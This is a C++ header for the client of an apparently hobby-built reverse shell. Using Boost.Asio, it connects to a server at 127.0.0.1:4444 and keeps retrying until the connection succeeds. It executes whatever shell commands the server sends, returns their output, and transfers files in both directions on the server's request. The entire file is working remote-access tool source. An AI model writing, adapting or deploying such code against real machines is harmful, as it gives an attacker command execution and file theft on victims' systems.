#ifndef _CLIENT_H_
#define _CLIENT_H_

#define _WIN32_WINDOWS 0x0A00
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <array>
#include <fstream>
#include <boost/asio.hpp>
#include <boost/optional.hpp>
#include <string>
#include <iostream>
#include <filesystem>
#include <boost/algorithm/string.hpp>
#include <unordered_map>
#include "CommandExecuter.h"
#include "../CommonReverseShell/Functions.hpp"

class Client
{
private:
	using IoService = boost::asio::io_service;
	using TcpResolver = boost::asio::ip::tcp::resolver;

public:

	Client()
		: m_ioService(IoService()), m_socket(m_ioService), m_ShellUtils(this)
	{
		Connect();
		m_ShellUtils.Start();
		m_ioService.run();
	}

private:

	void Connect()
	{
		TcpResolver resolver(m_ioService);
		auto endpointIterator = resolver.resolve({ "127.0.0.1", "4444" });

		while (true)
		{
			boost::asio::connect(m_socket, endpointIterator, m_ShellUtils.m_errorCode);
			if (!m_ShellUtils.m_errorCode)
				return;

			std::cout << "Coudn't connect to server. Check that it is up and listening " << std::endl;
			m_socket.close();
			std::this_thread::sleep_for(std::chrono::seconds(3));
		}

		std::cout << "Connected to: " << m_socket.remote_endpoint().address().to_string() << std::endl;
	}

	SharedReverseShellUtils<Client>::OperationType ReadOperationType()
	{
		auto operation = m_ShellUtils.Response();
		return m_ShellUtils.GetOperationType(operation);		
	}

	void Command()
	{
		auto command = m_ShellUtils.Response();
		std::cout << "Command to Run: " << command << std::endl;
		auto commandResult = RunShellCommand(command);
		std::cout << "Command Result: " << commandResult << std::endl;
		m_ShellUtils.Send(commandResult);
	}

	std::string RunShellCommand(const std::string& command)
	{
		CommandExecuter commandExecuter;
		auto commandResult = commandExecuter.RunShellCommand(command);
		return std::move(commandResult);
	}

	void Download()
	{
		auto localFilePath = m_ShellUtils.Response();
		std::cout << "File that server wants: " << localFilePath << std::endl;
		if (!TellServerIfFileExists(localFilePath))
			return;

		m_ShellUtils.Upload(localFilePath);
		std::cout << "File uploaded (local): " << localFilePath << std::endl;
	}

	void Upload()
	{
		auto filePath = m_ShellUtils.Response();
		std::cout << "Where to store the uploaded file: " << filePath << std::endl;
		TellServerIfFileExists(filePath);
		m_ShellUtils.OpenFileFor(filePath, std::ios::out | std::ios::binary);
		m_ShellUtils.Download(filePath);
	}

	bool TellServerIfFileExists(const std::string& filePath)
	{
		auto fileExists = IsRegularFileExists(filePath);
		m_ShellUtils.Send(std::to_string(fileExists));
		return fileExists;
	}

	void InvalidOperation()
	{
		throw; // TODO - throw specific exception
	}


public: // TODO - Turn this back into private after solving the CommonReverseShell template issues. 
	IoService m_ioService;
	boost::asio::ip::tcp::socket m_socket;
	SharedReverseShellUtils<Client> m_ShellUtils;
	friend class SharedReverseShellUtils<Client>;
};

#endif // !_CLIENT_H_
